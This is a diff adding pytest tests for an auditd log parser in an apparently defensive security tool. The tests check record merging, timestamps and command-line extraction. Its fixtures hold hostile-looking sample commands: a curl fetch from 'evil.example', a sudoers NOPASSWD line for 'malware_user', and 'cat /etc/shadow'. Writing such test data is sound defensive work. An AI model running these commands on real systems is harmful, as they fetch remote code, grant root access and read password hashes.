@@ -179,11 +179,142 @@ class TestAuditdSource:
         event = list(AuditdSource().parse(AUDIT_LOG))[1]
         assert event.fields["CommandLine"] == "curl -s https://evil.example/p.sh"
 
+    def test_stats_count_records_and_skipped_lines(self) -> None:
+        source = AuditdSource()
+        list(source.parse(AUDIT_LOG))
+        assert source.stats == {"records": 8, "skipped": 1}
+
+
+def _parse(tmp_path: Path, *lines: str) -> tuple[list[Event], AuditdSource]:
+    path = tmp_path / "audit.log"
+    path.write_bytes(("\n".join(lines) + "\n").encode("utf-8"))
+    source = AuditdSource()
+    return list(source.parse(path)), source
+
+
+class TestAuditdFormats:
+    """Record shapes found in Splunk attack_data that the B1 parser could not read."""
+
+    def test_interpreted_records_parse(self, tmp_path: Path) -> None:
+        events, source = _parse(
+            tmp_path,
+            "type=SYSCALL msg=audit(04/16/2025 09:14:42.784:96444) : arch=x86_64 "
+            "syscall=execve success=yes a0=0x5bb5511644d0 uid=root exe=/usr/bin/split",
+            "type=EXECVE msg=audit(04/16/2025 09:14:42.784:96444) : argc=4 a0=split a1=-b "
+            "a2=1000000 a3=split_me.txt ",
+            "----",
+        )
+        assert source.stats == {"records": 2, "separators": 1}
+        [event] = events
+        assert event.timestamp == datetime(2025, 4, 16, 9, 14, 42, 784000, tzinfo=UTC)
+        assert event.fields["syscall"] == "execve"
+        assert event.fields["uid"] == "root"
+        assert event.fields["Image"] == "/usr/bin/split"
+        assert event.fields["CommandLine"] == "split -b 1000000 split_me.txt"
+
+    def test_interpreted_values_keep_their_spaces(self, tmp_path: Path) -> None:
+        events, _ = _parse(
+            tmp_path,
+            "type=PROCTITLE msg=audit(02/20/2025 10:42:55.725:93710): "
+            "proctitle=echo malware_user ALL=(ALL) NOPASSWD: ALL",
+            "type=EXECVE msg=audit(02/20/2025 13:08:29.059:147588) : argc=3 a0=grep a1=-v "
+            "a2=File does not exist:\\|config-set-passwords already ran ",
+        )
+        assert events[0].fields["proctitle"] == "echo malware_user ALL=(ALL) NOPASSWD: ALL"
+        assert "ALL" not in events[0].fields  # not mistaken for a key
+        assert events[1].fields["a2"] == "File does not exist:\\|config-set-passwords already ran"
+        assert str(events[1].fields["CommandLine"]).startswith("grep -v File does not exist")
+
+    def test_interpreted_execve_is_bounded_by_argc(self, tmp_path: Path) -> None:
+        # argc=1: the one argument runs to the end, even where it looks like another key.
+        events, _ = _parse(
+            tmp_path, "type=EXECVE msg=audit(02/20/2025 10:00:00.000:1) : argc=1 a0=echo a1=b"
+        )
+        assert events[0].fields["CommandLine"] == "echo a1=b"
+        assert "a1" not in events[0].fields
+        assert events[0].fields["argc"] == "1"
+
+    def test_enriched_half_is_read(self, tmp_path: Path) -> None:
+        events, source = _parse(
+            tmp_path,
+            "type=SYSCALL msg=audit(1724076881.293:4522): syscall=42 a0=4 uid=1000 "
+            'comm="route" exe="/usr/sbin/route"\x1dARCH=x86_64 SYSCALL=connect UID="ubuntu"',
+        )
+        assert source.stats == {"records": 1}
+        fields = events[0].fields
+        assert (fields["syscall"], fields["SYSCALL"]) == ("42", "connect")
+        assert (fields["uid"], fields["UID"]) == ("1000", "ubuntu")
+
+    def test_quoted_msg_pairs_are_lifted(self, tmp_path: Path) -> None:
+        events, _ = _parse(
+            tmp_path,
+            "type=SERVICE_STOP msg=audit(1722957155.494:4802): pid=1 uid=0 auid=4294967295 "
+            'msg=\'unit=atd comm="systemd" exe="/usr/lib/systemd/systemd" res=success\'',
+        )
+        fields = events[0].fields
+        assert fields["unit"] == "atd"
+        assert fields["Image"] == "/usr/lib/systemd/systemd"
+        assert fields["auid"] == "4294967295"  # a number, never hex decoded
+        assert str(fields["msg"]).startswith("unit=atd")
+
+    def test_command_line_comes_only_from_execve(self, tmp_path: Path) -> None:
+        events, _ = _parse(
+            tmp_path,
+            "type=SYSCALL msg=audit(1780000000.100:1): syscall=59 a0=26 a1=55d11c9a4ec0 "
+            'exe="/usr/bin/id"',
+        )
+        fields = events[0].fields
+        assert "CommandLine" not in fields
+        assert fields["a0"] == "26"  # a syscall argument, not hex encoded text
+
+    def test_raw_proctitle_is_decoded_with_spaces(self, tmp_path: Path) -> None:
+        argv = b"cat\x00/etc/shadow".hex().upper()
+        record = f"type=PROCTITLE msg=audit(1780000000.100:1): proctitle={argv}"
+        events, _ = _parse(tmp_path, record)
+        assert events[0].fields["proctitle"] == "cat /etc/shadow"
+
+    def test_interleaved_records_are_merged(self, tmp_path: Path) -> None:
+        events, _ = _parse(
+            tmp_path,
+            'type=SYSCALL msg=audit(1780000000.100:1): syscall=59 exe="/usr/bin/id"',
+            'type=SYSCALL msg=audit(1780000000.100:2): syscall=59 exe="/usr/bin/ls"',
+            'type=EXECVE msg=audit(1780000000.100:1): argc=1 a0="id"',
+        )
+        assert [(e.fields["Image"], e.fields.get("CommandLine")) for e in events] == [
+            ("/usr/bin/id", "id"),
+            ("/usr/bin/ls", None),
+        ]
+
+    def test_hyphenated_keys_and_brace_groups(self, tmp_path: Path) -> None:
+        events, _ = _parse(
+            tmp_path,
+            "type=LOGIN msg=audit(1780000000.100:1): pid=5 old-auid=4294967295 auid=1000 "
+            "SADDR={ saddr_fam=inet laddr=192.0.2.10 lport=21 }",
+        )
+        fields = events[0].fields
+        assert (fields["old-auid"], fields["auid"]) == ("4294967295", "1000")
+        assert fields["laddr"] == "192.0.2.10"
+        assert str(fields["SADDR"]).startswith("{")
+
+    def test_record_reappearing_after_emission_is_warned(
+        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        import bastion.ingest.auditd as auditd
+
+        monkeypatch.setattr(auditd, "MERGE_WINDOW_RECORDS", 1)
+        with caplog.at_level(logging.WARNING):
+            events, _ = _parse(
+                tmp_path,
+                'type=SYSCALL msg=audit(1780000000.100:1): exe="/usr/bin/id"',
+                'type=SYSCALL msg=audit(1780000000.100:2): exe="/usr/bin/ls"',
+                'type=EXECVE msg=audit(1780000000.100:1): argc=1 a0="id"',
+            )
+        assert len(events) == 3
+        assert any("reappeared" in record.message for record in caplog.records)
+
 
 class TestJournaldSource:
-    def test_parses_json_lines_and_skips_garbage(
-        self, caplog: pytest.LogCaptureFixture
-    ) -> None:
+    def test_parses_json_lines_and_skips_garbage(self, caplog: pytest.LogCaptureFixture) -> None:
         with caplog.at_level(logging.WARNING):
             events = list(JournaldSource().parse(JOURNAL_LOG))
         assert len(events) == 3  # one non-JSON line and one binary message skipped
@@ -219,6 +350,7 @@ class TestSelectSource:
         log = tmp_path / "export.log"
         log.write_text('{"MESSAGE": "hello"}\n', encoding="utf-8")
         assert isinstance(select_source(log), JournaldSource)
+
     def test_evtx_extension_wins(self) -> None:
         assert isinstance(select_source(Path("logs.evtx")), EvtxSource)
 
